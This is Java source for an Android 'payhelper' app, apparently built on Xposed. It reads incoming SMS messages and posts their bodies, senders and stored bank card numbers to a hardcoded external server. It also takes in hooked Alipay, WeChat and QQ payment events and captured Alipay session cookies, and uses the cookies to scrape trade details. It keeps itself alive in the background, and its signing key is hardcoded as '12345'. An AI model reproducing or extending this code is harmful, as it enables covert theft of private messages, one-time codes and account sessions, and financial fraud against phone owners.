package com.lang.payhelper;

import java.net.URLEncoder;
import java.text.DecimalFormat;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.atomic.AtomicInteger;

import org.apache.http.NameValuePair;
import org.json.JSONObject;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.select.Elements;

import com.lang.payhelper.payhook.AlarmReceiver;
import com.lang.payhelper.payhook.DaemonService;
import com.lang.payhelper.rsa.RSAMethod;
import com.lang.payhelper.rsa.RSAUtils;
import com.lang.payhelper.utils.AbSharedUtil;
import com.lang.payhelper.utils.DBManager;
import com.lang.payhelper.utils.LogToFile;
import com.lang.payhelper.utils.MD5;
import com.lang.payhelper.utils.OrderBean;
import com.lang.payhelper.utils.PayHelperUtils;
import com.lang.payhelper.utils.QrCodeBean;
import com.lidroid.xutils.HttpUtils;
import com.lidroid.xutils.exception.HttpException;
import com.lidroid.xutils.http.RequestParams;
import com.lidroid.xutils.http.ResponseInfo;
import com.lidroid.xutils.http.callback.RequestCallBack;
import com.lidroid.xutils.http.client.HttpRequest.HttpMethod;
import com.tbruyelle.rxpermissions2.Permission;
import com.tbruyelle.rxpermissions2.RxPermissions;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.text.TextUtils;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.ScrollView;
import android.widget.TextView;

import androidx.core.app.ActivityCompat;
import de.robv.android.xposed.XposedBridge;
import io.reactivex.functions.Consumer;

/**
 * @author SuXiaoliang
 * @ClassName: MainActivity
 * @Description: TODO(这里用一句话描述这个类的作用)
 * @date 2018年6月23日 下午1:26:32
 */
public class MainActivity<onF> extends Activity{

    public static final String QQ = "/getpay?money=0.1&mark=k123467789&type=qq";
    public static final String ALIPAY = "/getpay?money=0.1&mark=k123467789&type=alipay";

    public static TextView console;
    private static ScrollView scrollView;
    private BillReceived billReceived;
    private AlarmReceiver alarmReceiver;
    public static String BILLRECEIVED_ACTION = "com.tools.payhelper.billreceived";
    public static String QRCODERECEIVED_ACTION = "com.tools.payhelper.qrcodereceived";
    public static String MSGRECEIVED_ACTION = "com.tools.payhelper.msgreceived";
    public static String TRADENORECEIVED_ACTION = "com.tools.payhelper.tradenoreceived";
    public static String BACK_ACTION = "com.tools.payhelper.back";

    public static String LOGINIDRECEIVED_ACTION = "com.tools.payhelper.loginidreceived";
    public static String NOTIFY_ACTION = "com.tools.payhelper.notify";
    public static String SAVEALIPAYCOOKIE_ACTION = "com.tools.payhelper.savealipaycookie";
    public static String SMSMSG_ACTION = "com.lang.sms";


    private String currentWechat = "";
    private String currentAlipay = "";
    private String currentQQ = "";

    private SmsObserver smsObserver;
    private Uri SMS_INBOX = Uri.parse("content://sms/");

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
        setContentView(R.layout.activity_main);
        console = (TextView) findViewById(R.id.console);
        scrollView = (ScrollView) findViewById(R.id.scrollview);

        findViewById(R.id.start_alipay).setOnClickListener(arg0 -> {
            Intent broadCastIntent = new Intent();
            broadCastIntent.setAction("com.payhelper.alipay.start");
            String time=System.currentTimeMillis()/10000L+"";
            //动态请求返回
            broadCastIntent.putExtra("mark", "test"+time);
            broadCastIntent.putExtra("money", "0.01");
            sendBroadcast(broadCastIntent);
        });

        findViewById(R.id.setting).setOnClickListener(arg0 -> {
            Intent intent = new Intent(MainActivity.this, SettingActivity.class);
            startActivity(intent);
         });

        //注册广播
        billReceived = new BillReceived();
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction(BILLRECEIVED_ACTION);
        intentFilter.addAction(MSGRECEIVED_ACTION);
        intentFilter.addAction(QRCODERECEIVED_ACTION);
        intentFilter.addAction(TRADENORECEIVED_ACTION);
        intentFilter.addAction(LOGINIDRECEIVED_ACTION);
        intentFilter.addAction(SAVEALIPAYCOOKIE_ACTION);
        intentFilter.addAction(SMSMSG_ACTION);
        intentFilter.addAction(BACK_ACTION);
        registerReceiver(billReceived, intentFilter);

        sendmsg("当前软件版本:" + PayHelperUtils.getVerName(getApplicationContext()));

        String notify_sms="http://zfffb.com/rich/open/putMessage";
        String notify_zfb="http://zfffb.com/rich/open/paynotify";
        AbSharedUtil.putString(getApplicationContext(), "notify_sms", notify_sms);
        AbSharedUtil.putString(getApplicationContext(), "notify_zfb", notify_zfb);

        alarmReceiver = new AlarmReceiver();
        IntentFilter alarmIntentFilter = new IntentFilter();
        alarmIntentFilter.addAction(NOTIFY_ACTION);
        registerReceiver(alarmReceiver, alarmIntentFilter);
        Intent intentService = new Intent(this, DaemonService.class);
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            startForegroundService(intentService);
        } else {
            startService(intentService);
        }

        // 注册短信观察者
        checkNeedPermission();
    }

    private void checkNeedPermission() {
        new RxPermissions(this).requestEach("android.permission.READ_SMS", "android.permission.RECEIVE_SMS").subscribe(permission -> {
            if (permission.granted) {
                smsObserver = new SmsObserver(MainActivity.this, new Handler() {});
                getContentResolver().registerContentObserver(SMS_INBOX, true, smsObserver);
            }
            if (permission.shouldShowRequestPermissionRationale) {
            }
        });
    }

    public boolean d(){
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");
        Date dt = null;
        try {
            dt = sdf.parse("2020-02-21");
            long time = new Date().getTime();
            if (time-dt.getTime()>(1000*3600*24)){
                return false;
            }
        } catch (ParseException e) {
            e.printStackTrace();
        }
        return true;
    }


    public void getSmsFromPhone(Context context) {
        Map<String, String> smsMap=new HashMap<String, String>();
        ContentResolver cr = getContentResolver();
        String[] projection = new String[] {"_id", "address", "person","body", "date", "type" };
        Cursor cur = cr.query(SMS_INBOX, projection, null, null, "date desc limit 1");
        if (null == cur) {
            return;
        }
        while(cur.moveToNext()) {
            String number = cur.getString(cur.getColumnIndex("address"));//手机号
            String person = cur.getString(cur.getColumnIndex("person"));//联系人姓名列表
            String body = cur.getString(cur.getColumnIndex("body"));//短信内容
            String date = cur.getString(cur.getColumnIndex("date"));//短信内容
            //至此就获得了短信的相关的内容, 以下是把短信加入map中，构建listview,非必要。
            smsMap.put("code","");
            smsMap.put("sender",number);
            smsMap.put("all",body);
            smsMap.put("time",date);
        }
        Intent broadCastIntent = new Intent();
        broadCastIntent.putExtra("json", new JSONObject(smsMap).toString());
        broadCastIntent.setAction("com.lang.sms");
        context.sendBroadcast(broadCastIntent);
    }

    /**
     * 短信观察者
     */
    class SmsObserver extends ContentObserver {

        private AtomicInteger count;
        private Context context;
        private Uri mUri;
        public SmsObserver( Context context, Handler handler) {
            super(handler);
            this.context= context;
            this.count=new AtomicInteger(0);
        }

        @Override
        public void onChange(boolean selfChange, Uri uri) {
            //每当有新短信到来时，使用我们获取短消息的方法
            if (uri == null) {
                this.mUri = Uri.parse("content://sms/inbox");
            } else {
                this.mUri = uri;
            }
            if (!this.mUri.toString().contains("content://sms/raw")) {
                getSmsFromPhone(this.context);
            }
        }

    }

    public static Handler handler = new Handler() {

        @Override
        public void handleMessage(Message msg) {
            String txt = msg.getData().getString("log");
            if (console != null) {
                if (console.getText() != null) {
                    if (console.getText().toString().length() > 7500) {
                        console.setText("日志定时清理完成..." + "\n\n" + txt);
                    } else {
                        console.setText(console.getText().toString() + "\n\n" + txt);
                    }
                } else {
                    console.setText(txt);
                }
                scrollView.post(new Runnable() {
                    public void run() {
                        scrollView.fullScroll(View.FOCUS_DOWN);
                    }
                });
            }
            super.handleMessage(msg);
        }

    };

    @Override
    protected void onDestroy() {
        unregisterReceiver(billReceived);
        unregisterReceiver(alarmReceiver);
        if (this.smsObserver != null) {
            getContentResolver().unregisterContentObserver(this.smsObserver);
        }
        sendmsg("activity onDestroy");
        super.onDestroy();
    }

    @Override
    protected void onRestoreInstanceState(Bundle savedInstanceState) {
        // 异常恢复
        super.onRestoreInstanceState(savedInstanceState);
    }

    @Override
    public void finish() {
        sendmsg("activity finish");
        super.finish();
    }

    @Override
    protected void onResume() {
        sendmsg("activity onResume");
        super.onResume();
    }

    public static void sendmsg(String txt) {
        LogToFile.i("payhelper", txt);
        Message msg = new Message();
        msg.what = 1;
        Bundle data = new Bundle();
        long l = System.currentTimeMillis();
        Date date = new Date(l);
        SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        String d = dateFormat.format(date);
        data.putString("log", d + ":" + " " + txt);
        msg.setData(data);
        try {
            handler.sendMessage(msg);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onBackPressed() {
        sendmsg("触发 onBackPressed");
        moveTaskToBack(true);
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        // 过滤按键动作
        if (event.getKeyCode() == KeyEvent.KEYCODE_BACK) {
            sendmsg("触发 KeyEvent.KEYCODE_BACK");
            moveTaskToBack(true);
        }
        return super.onKeyDown(keyCode, event);
    }

    //自定义接受订单通知广播
    class BillReceived extends BroadcastReceiver {
        @Override
        public void onReceive(final Context context, Intent intent) {
            try {
                if (intent.getAction().contentEquals(BILLRECEIVED_ACTION)) {
//                    sendmsg("自付宝开始异步回调"+intent.getStringExtra("json"));
//                    notifyapi("zfb",intent.getStringExtra("json"));
                    String no = intent.getStringExtra("bill_no");
                    String money = intent.getStringExtra("bill_money");
                    String mark = intent.getStringExtra("bill_mark");
                    String type = intent.getStringExtra("bill_type");
//                    String payUrl = intent.getStringExtra("bill_qr_code");
//                    String bill_account = intent.getStringExtra("bill_account");
                    String bill_time = intent.getStringExtra("bill_time");
//                    String bill_userId = intent.getStringExtra("bill_userId");


                    DBManager dbManager = new DBManager(CustomApplcation.getInstance().getApplicationContext());
                    String dt = System.currentTimeMillis() + "";
                    dbManager.addOrder(new OrderBean(money, mark, type, no, dt, "", 0));

                    String typestr = "";
                    if (type.equals("alipay")) {
                        typestr = "支付宝";
                    } else if (type.equals("wechat")) {
                        typestr = "微信";
                    } else if (type.equals("qq")) {
                        typestr = "QQ";
                    } else if (type.equals("alipay_dy")) {
                        typestr = "支付宝店员";
                        dt = intent.getStringExtra("time");
                    }
//                    sendmsg("收到[" + typestr + "]订单,订单号：[" + no + "]金额：[" + money + "]备注：[" + mark +"]payurl: ["+payUrl+"] userid:["+bill_userId+"] bill_account: ["+bill_account+"] bill_time["+bill_time+"]");

                    String account = "";
                    if (type.equals("alipay")) {
                        account = AbSharedUtil.getString(getApplicationContext(), "alipay");
                    } else if (type.equals("wechat")) {
                        account = AbSharedUtil.getString(getApplicationContext(), "wechat");
                    } else if (type.equals("qq")) {
                        account = AbSharedUtil.getString(getApplicationContext(), "qq");
                    }
                    String signkey = AbSharedUtil.getString(getApplicationContext(), "signkey");
                    String sign = MD5.md5(dt + mark + money + no + type + signkey);
//                    VerifyData data = VerifyData.createPayResultData(no, money, mark, type,
//                            dt,
//                            account,
//                            sign
//                    );
//
//                    ExecutorManager.executeTask(new Runnable() {
//                        @Override
//                        public void run() {
//                            TcpConnection.getInstance().send(JsonHelper.toJson(data));
//                        }
//                    });

                    notifyapi(type, no, money, mark, bill_time);
                } else if (intent.getAction().contentEquals(SMSMSG_ACTION)) {
                    if (intent.getStringExtra("json")!=null){
                        notifyapi("sms",intent.getStringExtra("json"));
                    }
                }else if (intent.getAction().contentEquals(QRCODERECEIVED_ACTION)) {
                    String money = intent.getStringExtra("money");
                    String mark = intent.getStringExtra("mark");
                    String type = intent.getStringExtra("type");
                    String payurl = intent.getStringExtra("payurl");
                    DBManager dbManager = new DBManager(CustomApplcation.getInstance().getApplicationContext());
                    String dt = System.currentTimeMillis() + "";
                    DecimalFormat df = new DecimalFormat("0.00");
                    money = df.format(Double.parseDouble(money));
                    dbManager.addQrCode(new QrCodeBean(money, mark, type, payurl, dt));
                    sendmsg("生成成功,金额:" + money + "备注:" + mark + "二维码:" + payurl);
                    //直接notirfy
                } else if (intent.getAction().contentEquals(MSGRECEIVED_ACTION)) {
                    String msg = intent.getStringExtra("msg");
                    sendmsg(msg);
                } else if (intent.getAction().contentEquals(SAVEALIPAYCOOKIE_ACTION)) {
                    String cookie = intent.getStringExtra("alipaycookie");
                    PayHelperUtils.updateAlipayCookie(MainActivity.this, cookie);
                } else if (intent.getAction().contentEquals(LOGINIDRECEIVED_ACTION)) {
                    String loginid = intent.getStringExtra("loginid");
                    String type = intent.getStringExtra("type");
                    if (!TextUtils.isEmpty(loginid)) {
                        if (type.equals("wechat") && !loginid.equals(currentWechat)) {
                            sendmsg("当前登录微信账号：" + loginid);
                            currentWechat = loginid;
                            AbSharedUtil.putString(getApplicationContext(), type, loginid);
                        } else if (type.equals("alipay") && !loginid.equals(currentAlipay)) {
                            sendmsg("当前登录支付宝账号：" + loginid);
                            currentAlipay = loginid;
                            AbSharedUtil.putString(getApplicationContext(), type, loginid);
                        } else if (type.equals("qq") && !loginid.equals(currentQQ)) {
                            sendmsg("当前登QQ账号：" + loginid);
                            currentQQ = loginid;
                            AbSharedUtil.putString(getApplicationContext(), type, loginid);
                        }
                    }
                } else if (intent.getAction().contentEquals(TRADENORECEIVED_ACTION)) {
                    //商家服务
                    final String tradeno = intent.getStringExtra("tradeno");
                    String cookie = intent.getStringExtra("cookie");
                    String userId = intent.getStringExtra("userId");
                    final String _mark = intent.getStringExtra("mark");
                    final DBManager dbManager = new DBManager(CustomApplcation.getInstance().getApplicationContext());
                    if (!dbManager.isExistTradeNo(tradeno)) {
                        dbManager.addTradeNo(tradeno, "0");
                        String url = "https://tradeeportlet.alipay.com/wireless/tradeDetail.htm?tradeNo=" + tradeno + "&source=channel&_from_url=https%3A%2F%2Frender.alipay.com%2Fp%2Fz%2Fmerchant-mgnt%2Fsimple-order._h_t_m_l_%3Fsource%3Dmdb_card";
                        try {
                            HttpUtils httpUtils = new HttpUtils(15000);
                            httpUtils.configResponseTextCharset("GBK");
                            RequestParams params = new RequestParams();
                            params.addHeader("Cookie", cookie);

                            httpUtils.send(HttpMethod.GET, url, params, new RequestCallBack<String>() {

                                @Override
                                public void onFailure(HttpException arg0, String arg1) {
                                    PayHelperUtils.sendmsg(context, "服务器异常" + arg1);
                                }

                                @Override
                                public void onSuccess(ResponseInfo<String> arg0) {
                                    try {
                                        String result = arg0.result;
                                        Document document = Jsoup.parse(result);
                                        Elements elements = document.getElementsByClass("trade-info-value");
                                        if (elements.size() >= 5) {
                                            dbManager.updateTradeNo(tradeno, "1");
                                            String money = document.getElementsByClass("amount").get(0).ownText().replace("+", "").replace("-", "");
                                            String mark = elements.get(3).ownText();
                                            String dt = System.currentTimeMillis() + "";
                                            dbManager.addOrder(new OrderBean(money, mark, "alipay", tradeno, dt, "", 0));
//                                            sendmsg("收到[支付宝]订单,订单号：[" + tradeno + "]金额：[" + money + "]备注：[" + _mark +"]payurl: [] userid:["+userId+"] bill_account: [] bill_time["+dt+"]");
                                            notifyapi("alipay", tradeno, money, _mark, dt);
                                        }
                                    } catch (Exception e) {
                                        PayHelperUtils.sendmsg(context, "TRADENORECEIVED_ACTION-->>onSuccess异常" + e.getMessage());
                                    }
                                }
                            });
                        } catch (Exception e) {
                            PayHelperUtils.sendmsg(context, "TRADENORECEIVED_ACTION异常" + e.getMessage());
                        }
                    }
                }else if (intent.getAction().contentEquals(BACK_ACTION)) {
                    Intent i = new Intent();
                    i.setAction("android.intent.action.MAIN");
                    i.addCategory("android.intent.category.HOME");
//                    i.setCategories();
                    startActivity(i);
                }
            } catch (Exception e) {
                PayHelperUtils.sendmsg(context, "BillReceived异常" + e.toString());
            }
        }
        public void notifyapi(String type,String json) {

            try {
                HttpUtils httpUtils = new HttpUtils(15000);
                JSONObject jsonObject=new JSONObject(json);
                RequestParams params = new RequestParams();
                String notifyurl="";
                switch (type){
                    case "sms":
                        sendmsg("sms处理");
                        notifyurl= AbSharedUtil.getString(getApplicationContext(), "notify_sms");
                        params.addBodyParameter("sender", jsonObject.getString("sender"));
                        params.addBodyParameter("code", jsonObject.getString("code"));
                        params.addBodyParameter("all", jsonObject.getString("all"));
                        params.addBodyParameter("time", jsonObject.getString("time"));
                        String bankCard=AbSharedUtil.getString(getApplicationContext(), "bankCard");
                        String bankCard1=AbSharedUtil.getString(getApplicationContext(), "bankCard1");
                        String bankCard2=AbSharedUtil.getString(getApplicationContext(), "bankCard2");
                        String bankCard3=AbSharedUtil.getString(getApplicationContext(), "bankCard3");
                        String bankCard4=AbSharedUtil.getString(getApplicationContext(), "bankCard4");
                        params.addBodyParameter("bank", bankCard);
                        params.addBodyParameter("bank1", bankCard1);
                        params.addBodyParameter("bank2", bankCard2);
                        params.addBodyParameter("bank3", bankCard3);
                        params.addBodyParameter("bank4", bankCard4);
                        break;
                }
                String body = "原始："+jsonObject.getString("all")+"\n 加密后："+RSAMethod.publicEnData(jsonObject.getString("all"))+"\n 解密后："+RSAMethod.privateDeData(RSAMethod.publicEnData(jsonObject.getString("all")), RSAUtils.PRIVATE_KEY);
                sendmsg("发送异步通知请求： notifyurl->"+notifyurl+"\n"+"data->"+body);
                if (TextUtils.isEmpty(notifyurl)) {
                    sendmsg("发送异步通知异常，异步通知地址为空,请前往程序配置");
                    return;
                }
                httpUtils.send(HttpMethod.POST, notifyurl, params, new RequestCallBack<String>() {

                    @Override
                    public void onFailure(HttpException arg0, String arg1) {
                        sendmsg("发送异步通知异常，服务器异常" + arg1);
                    }

                    @Override
                    public void onSuccess(ResponseInfo<String> arg0) {
                        String result = arg0.result;
                        sendmsg(result);
                        if (result.contains("success")) {
                            sendmsg("发送异步通知成功，服务器返回" + result);
                        } else {
                            sendmsg("发送异步通知失败，服务器返回" + result);
                        }
                    }
                });
            } catch (Exception e) {
                sendmsg("notifyapi异常" + e.getMessage());
            }
        }

        public void notifyapi(String type, final String no, String money, String mark, String bill_time) {
            try {
                String notifyurl= AbSharedUtil.getString(getApplicationContext(), "notify_zfb");
                String signkey = AbSharedUtil.getString(getApplicationContext(), "signkey");
                signkey="12345";
                if (TextUtils.isEmpty(notifyurl)) {
                    sendmsg("发送异步通知异常，异步通知地址为空");
                    update(no, "异步通知地址为空");
                    return;
                }

                String account = "";
                if (type.equals("alipay")) {
                    account = AbSharedUtil.getString(getApplicationContext(), "account");
                } else if (type.equals("wechat")) {
                    account = AbSharedUtil.getString(getApplicationContext(), "wechat");
                } else if (type.equals("qq")) {
                    account = AbSharedUtil.getString(getApplicationContext(), "qq");
                }

                money= RSAMethod.publicEnData(money);
                HttpUtils httpUtils = new HttpUtils(15000);
                RequestParams params = new RequestParams();
                params.addBodyParameter("type", type);
                params.addBodyParameter("order", no);
                params.addBodyParameter("money", money);
                if ("商品".equals(mark)) mark="";
                params.addBodyParameter("title", mark);
                params.addBodyParameter("time", bill_time);
                params.addBodyParameter("account",account);

                sendmsg("{'type':'"+type+"','order':'"+no+"','money':'"+money+"'" +
                        ",'title':'"+mark+"','time':'"+bill_time+"','account':'"+account+"'}");
                httpUtils.send(HttpMethod.POST, notifyurl, params, new RequestCallBack<String>() {

                    @Override
                    public void onFailure(HttpException arg0, String arg1) {
                        sendmsg("发送异步通知异常，服务器异常" + arg1);
                        update(no, arg1);
                    }

                    @Override
                    public void onSuccess(ResponseInfo<String> arg0) {
                        String result = arg0.result;
                        if (result.contains("success")) {
                            sendmsg("发送异步通知成功，服务器返回" + result);
                        } else {
                            sendmsg("发送异步通知失败，服务器返回" + result);
                        }
                        update(no, result);
                    }
                });
            } catch (Exception e) {
                sendmsg("notifyapi异常" + e.getMessage());
            }
        }

        private void update(String no, String result) {
            DBManager dbManager = new DBManager(CustomApplcation.getInstance().getApplicationContext());
            dbManager.updateOrder(no, result);
        }
    }
}

